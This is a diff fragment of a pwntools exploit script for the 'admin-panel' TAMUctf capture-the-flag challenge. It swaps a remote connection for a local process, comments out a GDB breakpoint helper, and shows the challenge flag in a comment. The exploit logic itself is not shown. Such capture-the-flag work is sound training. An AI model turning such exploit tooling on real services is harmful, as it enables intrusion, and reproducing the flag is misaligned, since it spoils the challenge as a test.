@@ -4,19 +4,19 @@ from pwn import *
 exe = ELF("./admin-panel_patched")
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-2.28.so")
-# p = process([exe.path])
-p = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
-def GDB():
-    context.terminal = ["alacritty", "-e"]
-    gdb.attach(p, gdbscript='''
-
-               # b*0x555555555496
-               b*main+279
-               # #
-               # b*0x00005555555552ff
-               b*admin+281
-
-           ''')
+p = process([exe.path])
+# p = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
+# def GDB():
+#     context.terminal = ["alacritty", "-e"]
+#     gdb.attach(p, gdbscript='''
+#
+#                # b*0x555555555496
+#                b*main+279
+#                # #
+#                # b*0x00005555555552ff
+#                b*admin+281
+#
+#            ''')
 
 info = lambda msg: log.info(msg)
 sla = lambda msg, data: p.sendlineafter(msg, data)
@@ -60,7 +60,7 @@ def main():
 
 
 #gigem{l3ak1ng_4ddre55e5_t0_byp4ss_s3cur1t1e5!!}
-    p.interactive(prompt="")
+    p.interactive()
 
 
 
